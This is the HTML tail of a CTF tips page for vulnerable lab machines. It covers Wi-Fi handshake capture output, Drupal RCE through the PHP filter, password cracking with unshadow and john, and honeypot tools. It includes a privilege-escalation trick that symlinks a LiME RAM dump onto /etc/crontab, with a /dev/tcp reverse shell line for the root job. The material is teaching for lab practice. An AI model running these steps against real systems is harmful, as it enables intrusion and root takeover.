<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.994843</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.996890</span> <span class="n">Assoc</span> <span class="n">Response</span> <span class="n">AID</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">:</span> <span class="n">PRIVACY</span> <span class="p">:</span> <span class="n">Successful</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.996882</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.011783</span> <span class="n">Action</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">BA</span> <span class="n">ADDBA</span> <span class="n">Response</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.012314</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.012827</span> <span class="n">BAR</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span> <span class="n">TA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span> <span class="n">CTL</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">SEQ</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.013330</span> <span class="n">BA</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.014874</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v2</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">117</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.015379</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.030226</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">117</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.030746</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.043034</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v2</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">175</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.043026</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.054803</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">95</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.056338</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">95</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.056859</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.064514</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.065030</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.079878</span> <span class="n">Clear</span><span class="o">-</span><span class="n">To</span><span class="o">-</span><span class="n">Send</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.080901</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.108096</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.108096</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.110144</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Transfer an image</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">base64</span> <span class="n">flair</span><span class="o">.</span><span class="n">jpg</span>
<span class="n">Copy</span> <span class="n">output</span>
<span class="n">vi</span> <span class="n">flair</span>
<span class="n">Paste</span> <span class="n">the</span> <span class="n">clipboard</span>
<span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="n">flair</span> <span class="o">&gt;</span> <span class="n">flair</span><span class="o">.</span><span class="n">jpg</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Have a web-accessible git ? utilize <a class="reference external" href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a> to rip web accessible (distributed) version control systems: SVN, GIT, Mercurial/hg, bzr. It can rip repositories even when directory browsing is turned off. Eric Gruber has written a blog on <a class="reference external" href="https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/">Dumping Git Data from Misconfigured Web Servers</a> providing good walkthru.</li>
<li>It&#8217;s always important to find, what&#8217;s installed on the box:</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">dpkg</span><span class="o">-</span><span class="n">query</span> <span class="o">-</span><span class="n">l</span>
</pre></div>
</div>
<p>or using wild cards</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">dpkg</span><span class="o">-</span><span class="n">query</span> <span class="o">-</span><span class="n">l</span> <span class="s1">&#39;perl*&#39;</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p class="first">Find recently modified files:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">mmin</span> <span class="o">-</span><span class="mi">10</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
</pre></div>
</div>
<p>The above will show you which files have been modified within the last 10 minutes, which could help you find out whether an important config file, or log file has been modified.</p>
</li>
<li><p class="first">Getting a reverse shell from:</p>
</li>
</ul>
<blockquote>
<div><ul>
<li><p class="first">Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module. Once enabled we need to give permission to use it so in people -&gt; permissions check &#8220;Use the PHP code text for.</p>
<p>Next I create a new block (by going to Blocks, under the Structure menu) with the following content. I make sure to select PHP code from the Text format drop down. Taken from &lt;<a class="reference external" href="https://g0blin.co.uk/droopy-vulnhub-writeup/">https://g0blin.co.uk/droopy-vulnhub-writeup/</a>&gt;
Drupal settings file location: /var/www/html/sites/default/settings.php</p>
</li>
</ul>
</div></blockquote>
<ul>
<li><p class="first">If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.</p>
</li>
<li><p class="first">Want to send a email via the SMTP server something like SMTP-Open-Relay utilize <a class="reference external" href="http://www.jetmore.org/john/code/swaks/">Swaks</a> Swiss Army Knife for SMTP.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">swaks</span> <span class="o">--</span><span class="n">to</span> <span class="n">xxxxx</span><span class="nd">@example</span><span class="o">.</span><span class="n">com</span> <span class="o">--</span><span class="kn">from</span> <span class="nn">xxxxxee</span><span class="nd">@example</span><span class="o">.</span><span class="n">edu</span> <span class="o">--</span><span class="n">server</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">110.105</span><span class="p">:</span><span class="mi">2525</span> <span class="o">--</span><span class="n">body</span> <span class="s2">&quot;Hey Buddy How are you doing&quot;</span> <span class="o">--</span><span class="n">header</span> <span class="s2">&quot;Subject: Hello! Long time&quot;</span>
</pre></div>
</div>
</li>
<li><p class="first">Got /etc/shadow file?, utilize /etc/passwd with unshadow command and use john or cudahashcat to crack passwords.</p>
</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">unshadow</span> <span class="n">passwd</span> <span class="n">shadown</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p class="first">In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let&#8217;s say the ramdump was saved at</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ramdump</span>
</pre></div>
</div>
<p>If, you create a symlink from /tmp/ramdump to /etc/crontab</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ramdump</span>
</pre></div>
</div>
<p>Now, when the ramdump is taken, lime will now dump the content of RAM straight into /etc/crontab. As crontab will ignore everything which doesn’t match the correct syntax. If the memory contains a injected string such as</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">cron</span><span class="o">.</span><span class="n">py</span>
<span class="nb">print</span> <span class="s2">&quot;* * * * * root /bin/bash /home/username/evilscript&quot;</span>
</pre></div>
</div>
<p>the injected string will end up in /etc/crontab will be executed.</p>
<p>The contents of evilscript can be</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">IP</span><span class="o">/</span><span class="n">Port</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
</pre></div>
</div>
<p>which will provide the root shell to the attacker. Thanks to TheColonial :)</p>
</li>
<li><p class="first">Handy Stuff</p>
</li>
</ul>
<blockquote>
<div><ul class="simple">
<li>Utilize xxd to convert hex to ascii</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">xxd</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">p</span>
<span class="o">-</span><span class="n">p</span> <span class="o">|</span> <span class="o">-</span><span class="n">ps</span> <span class="o">|</span> <span class="o">-</span><span class="n">postscript</span> <span class="o">|</span> <span class="o">-</span><span class="n">plain</span> <span class="p">:</span> <span class="n">output</span> <span class="ow">in</span> <span class="n">postscript</span> <span class="n">continuous</span> <span class="n">hexdump</span> <span class="n">style</span><span class="o">.</span> <span class="n">Also</span> <span class="n">known</span> <span class="k">as</span> <span class="n">plain</span> <span class="n">hexdump</span> <span class="n">style</span><span class="o">.</span>
<span class="o">-</span><span class="n">r</span> <span class="o">|</span> <span class="o">-</span><span class="n">revert</span> <span class="p">:</span> <span class="n">reverse</span> <span class="n">operation</span><span class="p">:</span> <span class="n">convert</span> <span class="p">(</span><span class="ow">or</span> <span class="n">patch</span><span class="p">)</span> <span class="n">hexdump</span> <span class="n">into</span> <span class="n">binary</span><span class="o">.</span>  <span class="n">If</span> <span class="ow">not</span> <span class="n">writing</span> <span class="n">to</span> <span class="n">stdout</span><span class="p">,</span> <span class="n">xxd</span> <span class="n">writes</span> <span class="n">into</span> <span class="n">its</span> <span class="n">output</span> <span class="n">file</span> <span class="n">without</span> <span class="n">truncating</span> <span class="n">it</span><span class="o">.</span> <span class="n">Use</span> <span class="n">the</span> <span class="n">combination</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">p</span> <span class="n">to</span> <span class="n">read</span> <span class="n">plain</span> <span class="n">hexadecimal</span> <span class="n">dumps</span> <span class="n">without</span> <span class="n">line</span> <span class="n">number</span> <span class="n">information</span> <span class="ow">and</span> <span class="n">without</span> <span class="n">a</span> <span class="n">particular</span> <span class="n">column</span> <span class="n">layout</span><span class="o">.</span> <span class="n">Additional</span> <span class="n">Whitespace</span> <span class="ow">and</span> <span class="n">line</span><span class="o">-</span><span class="n">breaks</span> <span class="n">are</span> <span class="n">allowed</span> <span class="n">anywhere</span><span class="o">.</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Use python</li>
</ul>
<blockquote>
<div><ul class="simple">
<li>binascii.unhexlify(hexstr) to convert hex to string</li>
<li>base64.decodestring(str) to decode base64 string</li>
</ul>
</div></blockquote>
</div></blockquote>
</div>
</div>
<div class="section" id="cyber-deception">
<h2>Cyber-Deception<a class="headerlink" href="#cyber-deception" title="Permalink to this headline">¶</a></h2>
<div class="section" id="wordpot">
<h3>Wordpot<a class="headerlink" href="#wordpot" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/gbrindisi/wordpot">Wordpot</a> : Wordpot is a Wordpress honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a wordpress installation.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>python /opt/wp/wordpot.py --host=$lanip --port=69 --title=Welcome to XXXXXXX Blog Beta --ver=1.0 --server=XXXXXXXWordpress
</pre></div>
</div>
</div>
<div class="section" id="fakesmtp">
<h3>FakeSMTP<a class="headerlink" href="#fakesmtp" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="http://nilhcem.com/FakeSMTP/">FakeSMTP</a> : FakeSMTP is a Free Fake SMTP Server with GUI for testing emails in applications easily.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">fakesmtp</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">fakeSMTP</span><span class="o">-</span><span class="mf">2.1</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">.</span><span class="n">jar</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">b</span> <span class="o">-</span><span class="n">p</span> <span class="mi">2525</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span>
</pre></div>
</div>
</div>
<div class="section" id="rubberglue">
<h3>Rubberglue<a class="headerlink" href="#rubberglue" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Rubberglue.md">Rubberglue</a> : We can use Rubberglue to listen on a port such that any traffic it receives on that port it will forward back to the client ( attacker ) on the same port.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">python2</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">honeyports</span><span class="o">/</span><span class="n">honeyports</span><span class="o">-</span><span class="mf">0.4</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">p</span> <span class="mi">23</span>
</pre></div>
</div>
</div>
<div class="section" id="knockd">
<h3>Knockd<a class="headerlink" href="#knockd" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="http://www.zeroflux.org/projects/knock">Knockd - Port-knocking server</a> : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special &#8220;knock&#8221; sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open &#8211; since knockd listens at the link-layer level, it sees all traffic even if it&#8217;s destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.</p>
</div>
<div class="section" id="dcept">
<h3>DCEPT<a class="headerlink" href="#dcept" title="Permalink to this headline">¶</a></h3>
<p>SecureWorks researchers have created a solution known as <a class="reference external" href="https://www.secureworks.com/blog/dcept">DCEPT (Domain Controller Enticing Password Tripwire)</a> to detect network intrusions. Github is <a class="reference external" href="https://github.com/secureworks/dcept">dcept</a></p>
</div>
</div>
<div class="section" id="useful-tools">
<h2>Useful Tools<a class="headerlink" href="#useful-tools" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><a class="reference external" href="https://github.com/g0tmi1k/exe2hex">exe2hex</a> : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell).</li>
<li><a class="reference external" href="https://github.com/secabstraction/PowerCat">Powercat</a> : A PowerShell TCP/IP swiss army knife that works with Netcat &amp; Ncat</li>
</ul>
<div disqus-identifier="CTF Series : Vulnerable Machines" disqus-shortname="techbitvijays" id="disqus_thread"></div></div>
</div>


          </div>
        </div>
      </div>
      <div class="clearer"></div>
    </div>
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
    <div class="footer" role="contentinfo">
        &#169; Copyright 2017, Vijay Kumar.
    </div>
  </body>
</html>